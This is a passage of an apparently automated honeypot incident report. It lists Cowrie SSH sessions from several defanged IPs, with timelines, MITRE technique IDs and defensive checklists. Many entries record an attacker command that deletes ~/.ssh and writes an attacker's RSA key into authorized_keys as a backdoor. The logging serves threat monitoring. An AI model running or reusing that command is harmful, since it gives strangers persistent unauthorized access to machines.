| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:22:07` | `cowrie.session.connect` |
| `2026-05-31 22:22:07` | `cowrie.client.version` |
| `2026-05-31 22:22:07` | `cowrie.client.kex` |
| `2026-05-31 22:22:08` | `cowrie.login.success` |
| `2026-05-31 22:22:09` | `cowrie.session.params` |
| `2026-05-31 22:22:09` | `cowrie.command.input` |
| `2026-05-31 22:22:09` | `cowrie.command.failed` |
| `2026-05-31 22:22:09` | `cowrie.log.closed` |
| `2026-05-31 22:22:09` | `cowrie.session.params` |
| `2026-05-31 22:22:09` | `cowrie.command.input` |
| `2026-05-31 22:22:09` | `cowrie.session.file_download` |
| `2026-05-31 22:22:09` | `cowrie.log.closed` |
| `2026-05-31 22:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40c217fee16b

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:22 |
| **Last Seen** | 2026-05-31 22:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:22:12` | `cowrie.session.connect` |
| `2026-05-31 22:22:12` | `cowrie.client.version` |
| `2026-05-31 22:22:12` | `cowrie.client.kex` |
| `2026-05-31 22:22:13` | `cowrie.login.success` |
| `2026-05-31 22:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5b28ed7c834

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:23 |
| **Last Seen** | 2026-05-31 22:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:23:37` | `cowrie.session.connect` |
| `2026-05-31 22:23:37` | `cowrie.client.version` |
| `2026-05-31 22:23:38` | `cowrie.client.kex` |
| `2026-05-31 22:23:38` | `cowrie.login.success` |
| `2026-05-31 22:23:39` | `cowrie.session.params` |
| `2026-05-31 22:23:39` | `cowrie.command.input` |
| `2026-05-31 22:23:39` | `cowrie.command.failed` |
| `2026-05-31 22:23:39` | `cowrie.log.closed` |
| `2026-05-31 22:23:39` | `cowrie.session.params` |
| `2026-05-31 22:23:39` | `cowrie.command.input` |
| `2026-05-31 22:23:40` | `cowrie.session.file_download` |
| `2026-05-31 22:23:40` | `cowrie.log.closed` |
| `2026-05-31 22:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f86b31719edd

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:23 |
| **Last Seen** | 2026-05-31 22:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:23:42` | `cowrie.session.connect` |
| `2026-05-31 22:23:42` | `cowrie.client.version` |
| `2026-05-31 22:23:42` | `cowrie.client.kex` |
| `2026-05-31 22:23:43` | `cowrie.login.success` |
| `2026-05-31 22:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebe94c8bf0e6

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:26 |
| **Last Seen** | 2026-05-31 22:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:26:38` | `cowrie.session.connect` |
| `2026-05-31 22:26:38` | `cowrie.client.version` |
| `2026-05-31 22:26:38` | `cowrie.client.kex` |
| `2026-05-31 22:26:39` | `cowrie.login.success` |
| `2026-05-31 22:26:39` | `cowrie.session.params` |
| `2026-05-31 22:26:39` | `cowrie.command.input` |
| `2026-05-31 22:26:39` | `cowrie.command.failed` |
| `2026-05-31 22:26:39` | `cowrie.log.closed` |
| `2026-05-31 22:26:40` | `cowrie.session.params` |
| `2026-05-31 22:26:40` | `cowrie.command.input` |
| `2026-05-31 22:26:40` | `cowrie.session.file_download` |
| `2026-05-31 22:26:40` | `cowrie.log.closed` |
| `2026-05-31 22:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8dded513766

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:26 |
| **Last Seen** | 2026-05-31 22:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:26:42` | `cowrie.session.connect` |
| `2026-05-31 22:26:42` | `cowrie.client.version` |
| `2026-05-31 22:26:43` | `cowrie.client.kex` |
| `2026-05-31 22:26:43` | `cowrie.login.success` |
| `2026-05-31 22:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39de0aeba954

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:28 |
| **Last Seen** | 2026-05-31 22:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:28:15` | `cowrie.session.connect` |
| `2026-05-31 22:28:15` | `cowrie.client.version` |
| `2026-05-31 22:28:15` | `cowrie.client.kex` |
| `2026-05-31 22:28:16` | `cowrie.login.success` |
| `2026-05-31 22:28:17` | `cowrie.session.params` |
| `2026-05-31 22:28:17` | `cowrie.command.input` |
| `2026-05-31 22:28:17` | `cowrie.command.failed` |
| `2026-05-31 22:28:17` | `cowrie.log.closed` |
| `2026-05-31 22:28:17` | `cowrie.session.params` |
| `2026-05-31 22:28:17` | `cowrie.command.input` |
| `2026-05-31 22:28:18` | `cowrie.session.file_download` |
| `2026-05-31 22:28:18` | `cowrie.log.closed` |
| `2026-05-31 22:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029d632aa7d0

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:28 |
| **Last Seen** | 2026-05-31 22:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:28:20` | `cowrie.session.connect` |
| `2026-05-31 22:28:20` | `cowrie.client.version` |
| `2026-05-31 22:28:21` | `cowrie.client.kex` |
| `2026-05-31 22:28:22` | `cowrie.login.success` |
| `2026-05-31 22:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08956808fced

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:29 |
| **Last Seen** | 2026-05-31 22:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:29:28` | `cowrie.session.connect` |
| `2026-05-31 22:29:28` | `cowrie.client.version` |
| `2026-05-31 22:29:28` | `cowrie.client.kex` |
| `2026-05-31 22:29:29` | `cowrie.login.success` |
| `2026-05-31 22:29:29` | `cowrie.session.params` |
| `2026-05-31 22:29:29` | `cowrie.command.input` |
| `2026-05-31 22:29:29` | `cowrie.command.failed` |
| `2026-05-31 22:29:30` | `cowrie.log.closed` |
| `2026-05-31 22:29:30` | `cowrie.session.params` |
| `2026-05-31 22:29:30` | `cowrie.command.input` |
| `2026-05-31 22:29:30` | `cowrie.session.file_download` |
| `2026-05-31 22:29:30` | `cowrie.log.closed` |
| `2026-05-31 22:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f3870c27cd

| Field | Detail |
|---|---|
| **Source IP** | `46.70.206[.]6` |
| **First Seen** | 2026-05-31 22:29 |
| **Last Seen** | 2026-05-31 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:29:33` | `cowrie.session.connect` |
| `2026-05-31 22:29:33` | `cowrie.client.version` |
| `2026-05-31 22:29:33` | `cowrie.client.kex` |
| `2026-05-31 22:29:34` | `cowrie.login.success` |
| `2026-05-31 22:29:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.70.206[.]6` to AbuseIPDB if not already reported
- [ ] Block `46.70.206[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4240ae433594

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:29 |
| **Last Seen** | 2026-05-31 22:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:29:44` | `cowrie.session.connect` |
| `2026-05-31 22:29:44` | `cowrie.client.version` |
| `2026-05-31 22:29:44` | `cowrie.client.kex` |
| `2026-05-31 22:29:45` | `cowrie.login.success` |
| `2026-05-31 22:29:46` | `cowrie.session.params` |
| `2026-05-31 22:29:46` | `cowrie.command.input` |
| `2026-05-31 22:29:46` | `cowrie.command.failed` |
| `2026-05-31 22:29:46` | `cowrie.log.closed` |
| `2026-05-31 22:29:47` | `cowrie.session.params` |
| `2026-05-31 22:29:47` | `cowrie.command.input` |
| `2026-05-31 22:29:47` | `cowrie.session.file_download` |
| `2026-05-31 22:29:47` | `cowrie.log.closed` |
| `2026-05-31 22:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e92cc9bc341

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:29 |
| **Last Seen** | 2026-05-31 22:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:29:50` | `cowrie.session.connect` |
| `2026-05-31 22:29:50` | `cowrie.client.version` |
| `2026-05-31 22:29:50` | `cowrie.client.kex` |
| `2026-05-31 22:29:51` | `cowrie.login.success` |
| `2026-05-31 22:29:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b10a6bdc18

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-05-31 22:30 |
| **Last Seen** | 2026-05-31 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:30:51` | `cowrie.session.connect` |
| `2026-05-31 22:30:51` | `cowrie.client.version` |
| `2026-05-31 22:30:51` | `cowrie.client.kex` |
| `2026-05-31 22:30:51` | `cowrie.login.success` |
| `2026-05-31 22:30:51` | `cowrie.session.params` |
| `2026-05-31 22:30:51` | `cowrie.command.input` |
| `2026-05-31 22:30:51` | `cowrie.command.failed` |
| `2026-05-31 22:30:51` | `cowrie.log.closed` |
| `2026-05-31 22:30:52` | `cowrie.session.params` |
| `2026-05-31 22:30:52` | `cowrie.command.input` |
| `2026-05-31 22:30:52` | `cowrie.session.file_download` |
| `2026-05-31 22:30:52` | `cowrie.log.closed` |
| `2026-05-31 22:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2000cb6da57c

| Field | Detail |
|---|---|
| **Source IP** | `183.82.111[.]224` |
| **First Seen** | 2026-05-31 22:30 |
| **Last Seen** | 2026-05-31 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:30:53` | `cowrie.session.connect` |
| `2026-05-31 22:30:53` | `cowrie.client.version` |
| `2026-05-31 22:30:53` | `cowrie.client.kex` |
| `2026-05-31 22:30:53` | `cowrie.login.success` |
| `2026-05-31 22:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.82.111[.]224` to AbuseIPDB if not already reported
- [ ] Block `183.82.111[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-778eb8e745f4

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:31 |
| **Last Seen** | 2026-05-31 22:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:31:13` | `cowrie.session.connect` |
| `2026-05-31 22:31:13` | `cowrie.client.version` |
| `2026-05-31 22:31:13` | `cowrie.client.kex` |
| `2026-05-31 22:31:14` | `cowrie.login.success` |
| `2026-05-31 22:31:14` | `cowrie.session.params` |
| `2026-05-31 22:31:14` | `cowrie.command.input` |
| `2026-05-31 22:31:14` | `cowrie.command.failed` |
| `2026-05-31 22:31:15` | `cowrie.log.closed` |
| `2026-05-31 22:31:15` | `cowrie.session.params` |
| `2026-05-31 22:31:15` | `cowrie.command.input` |
| `2026-05-31 22:31:15` | `cowrie.session.file_download` |
| `2026-05-31 22:31:15` | `cowrie.log.closed` |
| `2026-05-31 22:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347aa998d969

| Field | Detail |
|---|---|
| **Source IP** | `89.252.131[.]17` |
| **First Seen** | 2026-05-31 22:31 |
| **Last Seen** | 2026-05-31 22:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:31:18` | `cowrie.session.connect` |
| `2026-05-31 22:31:18` | `cowrie.client.version` |
| `2026-05-31 22:31:18` | `cowrie.client.kex` |
| `2026-05-31 22:31:19` | `cowrie.login.success` |
| `2026-05-31 22:31:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.252.131[.]17` to AbuseIPDB if not already reported
- [ ] Block `89.252.131[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6ef42e7341f

| Field | Detail |
|---|---|
| **Source IP** | `172.172.170[.]199` |
| **First Seen** | 2026-05-31 22:33 |
| **Last Seen** | 2026-05-31 22:33 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:33:29` | `cowrie.session.connect` |
| `2026-05-31 22:33:29` | `cowrie.client.version` |
| `2026-05-31 22:33:29` | `cowrie.client.kex` |
| `2026-05-31 22:33:30` | `cowrie.login.success` |
| `2026-05-31 22:33:31` | `cowrie.session.params` |
| `2026-05-31 22:33:31` | `cowrie.command.input` |
| `2026-05-31 22:33:31` | `cowrie.command.failed` |
| `2026-05-31 22:33:32` | `cowrie.log.closed` |
| `2026-05-31 22:33:32` | `cowrie.session.params` |
| `2026-05-31 22:33:32` | `cowrie.command.input` |
| `2026-05-31 22:33:33` | `cowrie.session.file_download` |
| `2026-05-31 22:33:33` | `cowrie.log.closed` |
| `2026-05-31 22:33:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.172.170[.]199` to AbuseIPDB if not already reported
- [ ] Block `172.172.170[.]199` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f82283240973

| Field | Detail |
|---|---|
| **Source IP** | `172.172.170[.]199` |
| **First Seen** | 2026-05-31 22:33 |
| **Last Seen** | 2026-05-31 22:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-31 22:33:42` | `cowrie.session.connect` |
| `2026-05-31 22:33:42` | `cowrie.client.version` |
| `2026-05-31 22:33:43` | `cowrie.client.kex` |
